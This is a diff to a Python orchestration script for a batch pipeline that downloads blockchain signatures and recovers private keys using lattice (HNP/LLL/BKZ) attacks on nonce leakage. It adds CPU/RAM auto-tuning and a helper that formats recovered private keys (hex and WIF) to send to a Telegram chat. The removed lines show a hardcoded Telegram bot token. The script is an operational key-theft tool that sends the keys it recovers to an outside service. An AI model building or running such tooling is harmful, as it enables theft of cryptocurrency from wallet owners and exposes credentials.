@@ -24,6 +24,162 @@ import urllib.request
 from pathlib import Path
 
 
+def _flag_provided(argv: list[str], flag: str) -> bool:
+    return any(a == flag or a.startswith(flag + "=") for a in argv)
+
+
+def _detect_mem_gib(default_gib: float = 8.0) -> float:
+    try:
+        with open("/proc/meminfo", "r", encoding="utf-8") as f:
+            for line in f:
+                if line.startswith("MemTotal:"):
+                    parts = line.split()
+                    if len(parts) >= 2:
+                        kib = int(parts[1])
+                        return max(1.0, kib / (1024.0 * 1024.0))
+    except Exception:
+        pass
+    return default_gib
+
+
+def _detect_mem_available_gib(default_gib: float = 1.0) -> float:
+    try:
+        with open("/proc/meminfo", "r", encoding="utf-8") as f:
+            for line in f:
+                if line.startswith("MemAvailable:"):
+                    parts = line.split()
+                    if len(parts) >= 2:
+                        kib = int(parts[1])
+                        return max(0.1, kib / (1024.0 * 1024.0))
+    except Exception:
+        pass
+    return default_gib
+
+
+def _sample_resource_pressure() -> dict[str, float]:
+    cpu = max(1, os.cpu_count() or 1)
+    mem_total = _detect_mem_gib()
+    mem_avail = _detect_mem_available_gib()
+    mem_pressure = 1.0 - max(0.0, min(1.0, mem_avail / max(0.1, mem_total)))
+    try:
+        load1 = os.getloadavg()[0]
+    except Exception:
+        load1 = 0.0
+    load_ratio = load1 / max(1.0, float(cpu))
+    return {
+        "cpu_count": float(cpu),
+        "mem_total_gib": mem_total,
+        "mem_available_gib": mem_avail,
+        "mem_pressure": mem_pressure,
+        "load1": load1,
+        "load_ratio": load_ratio,
+    }
+
+
+def apply_live_backoff(args: argparse.Namespace, sample: dict[str, float]) -> tuple[dict[str, int], int]:
+    cpu = max(1, int(sample["cpu_count"]))
+    mem_avail = float(sample["mem_available_gib"])
+    load_ratio = float(sample["load_ratio"])
+
+    level = 0
+    if mem_avail < 0.75 or load_ratio >= 2.0:
+        level = 3
+    elif mem_avail < 1.5 or load_ratio >= 1.4:
+        level = 2
+    elif mem_avail < 2.5 or load_ratio >= 1.0:
+        level = 1
+
+    eff_threads = int(args.threads)
+    eff_max_clusters = int(args.max_clusters)
+    eff_max_iter = int(args.max_iter)
+    eff_random_k = int(args.random_k_budget)
+    eff_cluster_min_sigs = int(args.cluster_min_sigs)
+    eff_cluster_risk = int(args.cluster_risk_threshold)
+
+    if level == 1:
+        eff_threads = max(1, min(eff_threads, max(1, cpu // 2)))
+        eff_max_clusters = max(20, min(eff_max_clusters, 80))
+        eff_max_iter = max(1, min(eff_max_iter, 2))
+        eff_random_k = min(eff_random_k, 1024)
+        eff_cluster_min_sigs = max(eff_cluster_min_sigs, 20)
+        eff_cluster_risk = max(eff_cluster_risk, 15)
+    elif level == 2:
+        eff_threads = max(1, min(eff_threads, max(1, cpu // 3)))
+        eff_max_clusters = max(15, min(eff_max_clusters, 50))
+        eff_max_iter = 1
+        eff_random_k = 0
+        eff_cluster_min_sigs = max(eff_cluster_min_sigs, 30)
+        eff_cluster_risk = max(eff_cluster_risk, 20)
+    elif level == 3:
+        eff_threads = max(1, min(eff_threads, max(1, cpu // 4)))
+        eff_max_clusters = max(10, min(eff_max_clusters, 30))
+        eff_max_iter = 1
+        eff_random_k = 0
+        eff_cluster_min_sigs = max(eff_cluster_min_sigs, 40)
+        eff_cluster_risk = max(eff_cluster_risk, 25)
+
+    effective = {
+        "threads": eff_threads,
+        "max_clusters": eff_max_clusters,
+        "max_iter": eff_max_iter,
+        "random_k_budget": eff_random_k,
+        "cluster_min_sigs": eff_cluster_min_sigs,
+        "cluster_risk_threshold": eff_cluster_risk,
+    }
+    return effective, level
+
+
+def auto_tune_pipeline_args(args: argparse.Namespace, argv: list[str]) -> None:
+    cpu = max(1, os.cpu_count() or 1)
+    mem_gib = _detect_mem_gib()
+
+    if mem_gib < 4:
+        thr_auto = min(2, cpu)
+        cluster_min_auto, cluster_risk_auto, max_clusters_auto = 45, 30, 30
+        max_iter_auto, rk_auto = 1, 0
+    elif mem_gib < 8:
+        thr_auto = min(4, max(1, cpu - 1))
+        cluster_min_auto, cluster_risk_auto, max_clusters_auto = 35, 25, 50
+        max_iter_auto, rk_auto = 1, 0
+    elif mem_gib < 16:
+        thr_auto = min(8, max(1, cpu - 1))
+        cluster_min_auto, cluster_risk_auto, max_clusters_auto = 25, 20, 80
+        max_iter_auto, rk_auto = 2, 0
+    elif mem_gib < 32:
+        thr_auto = min(12, max(1, cpu - 1))
+        cluster_min_auto, cluster_risk_auto, max_clusters_auto = 18, 15, 120
+        max_iter_auto, rk_auto = 2, 1024
+    else:
+        thr_auto = min(16, max(1, cpu - 1))
+        cluster_min_auto, cluster_risk_auto, max_clusters_auto = 12, 10, 200
+        max_iter_auto, rk_auto = 3, 4096
+
+    if not _flag_provided(argv, "--threads"):
+        args.threads = thr_auto
+    if not _flag_provided(argv, "--cluster-min-sigs"):
+        args.cluster_min_sigs = cluster_min_auto
+    if not _flag_provided(argv, "--cluster-risk-threshold"):
+        args.cluster_risk_threshold = cluster_risk_auto
+    if not _flag_provided(argv, "--max-clusters"):
+        args.max_clusters = max_clusters_auto
+    if not _flag_provided(argv, "--max-iter"):
+        args.max_iter = max_iter_auto
+    if not _flag_provided(argv, "--random-k-budget"):
+        args.random_k_budget = rk_auto
+
+    print(
+        "[auto-tune]",
+        f"cpu={cpu}",
+        f"mem_gib={mem_gib:.1f}",
+        f"threads={args.threads}",
+        f"cluster_min_sigs={args.cluster_min_sigs}",
+        f"cluster_risk_threshold={args.cluster_risk_threshold}",
+        f"max_clusters={args.max_clusters}",
+        f"max_iter={args.max_iter}",
+        f"random_k_budget={args.random_k_budget}",
+    )
+
+
 def resolve_python_explicit_or_default(python_arg: str) -> str:
     """Pick a deterministic interpreter for the pipeline.
 
@@ -233,6 +389,28 @@ def tail_nonempty_lines(path: Path, limit: int) -> list[str]:
     return lines[-limit:]
 
 
+def format_recovered_rows_for_telegram(path: Path, limit: int = 3) -> list[str]:
+    rows = tail_nonempty_lines(path, limit)
+    if not rows:
+        return []
+    formatted: list[str] = []
+    for raw in rows:
+        try:
+            obj = json.loads(raw)
+        except Exception:
+            formatted.append(raw)
+            continue
+        pub = obj.get("pubkey") or obj.get("pub") or "n/a"
+        priv = obj.get("priv_hex") or obj.get("priv") or obj.get("private_key") or "n/a"
+        wif = obj.get("wif") or "n/a"
+        r_val = obj.get("r") or "n/a"
+        method = obj.get("method") or "n/a"
+        formatted.append(
+            f"pub={pub}\npriv_hex={priv}\nwif={wif}\nr={r_val}\nmethod={method}"
+        )
+    return formatted
+
+
 def main() -> None:
     ap = argparse.ArgumentParser(description="Run download + recover in deterministic batches")
     ap.add_argument("--start-height", type=int, default=1, help="Initial block height")
@@ -254,6 +432,14 @@ def main() -> None:
                     help="Timeout (seconds) for HNP/LLL/BKZ solver subprocess")
     ap.add_argument("--hnp-min-leaks", type=int, default=8,
                     help="Minimum leakage rows required to run HNP solver")
+    ap.add_argument("--auto-tune", action="store_true", default=True,
+                    help="Auto-tune resource-sensitive parameters from machine CPU/RAM (default: enabled)")
+    ap.add_argument("--no-auto-tune", action="store_false", dest="auto_tune",
+                    help="Disable machine-aware auto-tuning")
+    ap.add_argument("--live-backoff", action="store_true", default=True,
+                    help="Dynamically reduce heavy recovery parameters when runtime memory/CPU pressure is high")
+    ap.add_argument("--no-live-backoff", action="store_false", dest="live_backoff",
+                    help="Disable runtime backoff and keep configured parameters fixed")
 
     ap.add_argument("--signatures", default="signatures.jsonl")
     ap.add_argument("--recovered", default="recovered_keys.jsonl")
@@ -275,10 +461,13 @@ def main() -> None:
                     help="Stop pipeline when new recovered key rows appear")
     ap.add_argument("--telegram-chat-id", default="",
                     help="Telegram chat id for alerts")
-    ap.add_argument("--telegram-bot-token", default="8249251869:AAHpYzEGTDx2u25h5RjAARL5-50sld3Dgws",
+    ap.add_argument("--telegram-bot-token", default="",
                     help="Telegram bot token; if empty uses TELEGRAM_BOT_TOKEN env var")
     ap.add_argument("--python", default=sys.executable, help="Python executable")
     args = ap.parse_args()
+
+    if args.auto_tune:
+        auto_tune_pipeline_args(args, sys.argv[1:])
 
     args.python = resolve_python_explicit_or_default(args.python)
 
@@ -322,6 +511,31 @@ def main() -> None:
         cycle_start = current_start
         print(f"\\n=== Cycle {cycle} | start={cycle_start} | batch={args.batch_size} ===")
 
+        effective = {
+            "threads": int(args.threads),
+            "max_clusters": int(args.max_clusters),
+            "max_iter": int(args.max_iter),
+            "random_k_budget": int(args.random_k_budget),
+            "cluster_min_sigs": int(args.cluster_min_sigs),
+            "cluster_risk_threshold": int(args.cluster_risk_threshold),
+        }
+        backoff_level = 0
+        sample = _sample_resource_pressure()
+        if args.live_backoff:
+            effective, backoff_level = apply_live_backoff(args, sample)
+        print(
+            "[runtime]",
+            f"backoff_level={backoff_level}",
+            f"mem_available_gib={sample['mem_available_gib']:.2f}",
+            f"load1={sample['load1']:.2f}",
+            f"threads={effective['threads']}",
+            f"cluster_min_sigs={effective['cluster_min_sigs']}",
+            f"cluster_risk_threshold={effective['cluster_risk_threshold']}",
+            f"max_clusters={effective['max_clusters']}",
+            f"max_iter={effective['max_iter']}",
+            f"random_k_budget={effective['random_k_budget']}",
+        )
+
         before_recovered = count_lines(Path(args.recovered))
 
         download_cmd = [
@@ -346,16 +560,20 @@ def main() -> None:
             "--sigs", args.signatures,
             "--audit-report", args.audit_report,
             "--decision-out", args.decision_report,
-            "--threads", str(args.threads),
+            "--threads", str(effective["threads"]),
             "--risk-threshold", str(args.risk_threshold),
-            "--cluster-min-sigs", str(args.cluster_min_sigs),
-            "--cluster-risk-threshold", str(args.cluster_risk_threshold),
-            "--max-clusters", str(args.max_clusters),
-            "--max-iter", str(args.max_iter),
-            "--random-k-budget", str(args.random_k_budget),
+            "--cluster-min-sigs", str(effective["cluster_min_sigs"]),
+            "--cluster-risk-threshold", str(effective["cluster_risk_threshold"]),
+            "--max-clusters", str(effective["max_clusters"]),
+            "--max-iter", str(effective["max_iter"]),
+            "--random-k-budget", str(effective["random_k_budget"]),
             "--hnp-timeout-sec", str(args.hnp_timeout_sec),
             "--hnp-min-leaks", str(args.hnp_min_leaks),
         ]
+        if args.auto_tune:
+            recover_cmd.append("--auto-tune")
+        else:
+            recover_cmd.append("--no-auto-tune")
         if args.enable_advanced_recover:
             recover_cmd.append("--enable-advanced-recover")
         else:
@@ -448,8 +666,8 @@ def main() -> None:
 
         if new_rows > 0:
             if bot_token and telegram_chat_id:
-                new_key_lines = tail_nonempty_lines(Path(args.recovered), min(new_rows, 5))
-                key_block = "\n".join(new_key_lines) if new_key_lines else "n/a"
+                key_lines = format_recovered_rows_for_telegram(Path(args.recovered), min(new_rows, 3))
+                key_block = "\n\n".join(key_lines) if key_lines else "n/a"
                 msg = (
                     "Recovered new rows.\n"
                     f"cycle={cycle}\n"
